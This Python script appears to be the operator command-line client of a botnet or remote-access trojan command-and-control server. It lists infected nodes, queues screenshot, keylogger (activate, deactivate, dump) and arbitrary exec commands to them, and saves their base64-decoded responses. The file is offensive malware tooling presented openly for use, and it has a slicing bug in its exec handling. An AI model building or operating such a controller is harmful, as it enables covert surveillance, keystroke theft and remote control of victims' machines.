#!/usr/bin/env python

import getopt, sys, json, base64, tempfile
from src.utils import pheader
pheader()

from src.configuration import loadProxyConfig, Configuration
loadProxyConfig()

from src.logger import log
from src.database import *
from src.utils import request, post, pheader, IMAGE


def usage():
    print ("   -l/--list \t List all nodes.")
    print ("   -s/--send-cmd <id> <command>")
    print ("   \t\t Send command to a bot.")
    print ("   -q/--queue-list")
    print ("   \t\t List command queue.")
    print ("   -i/--info <node id>")
    print ("   \t\t Node information.")
    print ("   -r/--response <command id>")
    print ("   \t\t List a command response.")
    print ("")
    sys.exit()


def usage_send_cmd():
    print ("   Use:")
    print ("   ./proxy-cli.py -s <node id> <cmd>")
    print ("")
    print ("   available cmds:")
    print ("     screenshot - take a screenshot of the node screen.")
    print ("     keylogger [on|off|dump] - activate, deactivate or download keylogger data.")
    print ("     plain json for custom commands.")
    print ("")
    sys.exit()


def list_all_nodes():
    contents = request('/admin/node/list')
    b = json.loads(contents)
    print("Nodes:")
    for item in b:
        print(" + " + str(item['node_id']))


def node_info(node_id):
    contents = request('/admin/node/' + node_id)
    b = json.loads(contents)
    print(" + " + str(b['node_id']))
    print("   Name: " + str(b['name']) + " / Created at: " + b['created_at'])
    print("   Logs: ")
    for item in b['pooling']:
        print("    - " + str(item['created_at']) + " / " + 
            PoolingLogs.poolingName(item['pooling_type'])
        )
    print("   Commands: ")
    for item in b['commands']:
        status = "to be executed"
        if item['status'] == CommandQueue.SUBMITTED:
            status = "executed!      "

        print("    - " + str(item['created_at']) + 
            " - " + status + ""
            " / " + 
            item['command']
        )


def send_cmd(node_id, cmd):
    cmd_ = {}
    cmd = cmd.decode()
    if cmd.startswith("screenshot"):
        cmd_ = {
            "name": "screenshot",
            'time': 'now',
            'delivery': 'now',
            'resolution': 'full'
        }
    elif cmd.startswith("keylogger"):
        cmd_ = {
            'name': 'keylogger',
            'time': 'now',
            'delivery': 'now'
        }
        if cmd.startswith("keylogger on"):
            cmd_['status'] = "activate"
        elif cmd.startswith("keylogger off"):
            cmd_['status'] = "deactivate"
        elif cmd.startswith("keylogger dump"):
            cmd_['status'] = "dump"
        else:
            print(str("Command not found"))
            usage_send_cmd()

    elif cmd.startswith("exec"):
        cmd_ = {
            'name': 'exec',
            'command': cmd[:5]
        }
    else:
        try:
            cmd = str(json.dumps(str(json.loads(cmd))))
        except:
            print(str("Command not found"))
            usage_send_cmd()


    if len(cmd_) > 0:
        cmd = str(json.dumps(cmd_))

    contents = post("/admin/node/cmd/send/" + node_id, cmd)

    j = json.loads(contents)
    if j['status'] == "ok":
        print("Command scheduled.")
    else:
        print(j['error'])

    for i in j['obs']:
        print(" - " + str(i))


def queue_list():
    contents = request('/admin/cmd/queue/list')
    j = json.loads(contents)
    for i in j:
        print(" + " + str(i['id']) + ": " + i['command'] + "")
        print("   " + i['node_id']['node_id'] + "")
        print("   Status: " + str(CommandQueue.statusName(i['status'])) + "")


def command_response(response_id):
    try:
        contents = request('/admin/cmd/response/' + response_id)
        j = json.loads(contents)
        if j['status'] == "ok":
            print(" + " + str(j['command']['id']))
            print("   " + j['response']['created_at'] + "")
            print("   Results: ")
            r = j['response']['results']
            r = base64.b64decode(r)
            fp = tempfile.NamedTemporaryFile(delete=False)
            fp.write(r)
            print("\t - Saved to: " + str(fp.name) + "")
            fp.close()
        else:
            print("Not yet ready.")
    except Exception as e:
        print(str(e))

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hls:qi:r:", ["send-cmd=", "list", "help", "queue", "info=", "response="])
        for o, a in opts:
            if o in ("-l", "--list"):
                list_all_nodes()
            elif o in ("-i", "--info"):
                print(str(type(a)))
                if a == None or a == "":
                    usage_send_cmd()  
                node_info(a)
            elif o in ("-r", "--response"):
                command_response(a)
            elif o in ("-q", "--queue-list"):
                queue_list()
            elif o in ("-s", "--send-cmd"):
                nid = a
                cmd = args.pop(0)
                send_cmd(nid, cmd.encode())
            elif o in ("-h", "--help"):
                usage()
    except getopt.GetoptError as err:
        print(str(err))
    except:
        usage_send_cmd()


if __name__ == "__main__":
    main()

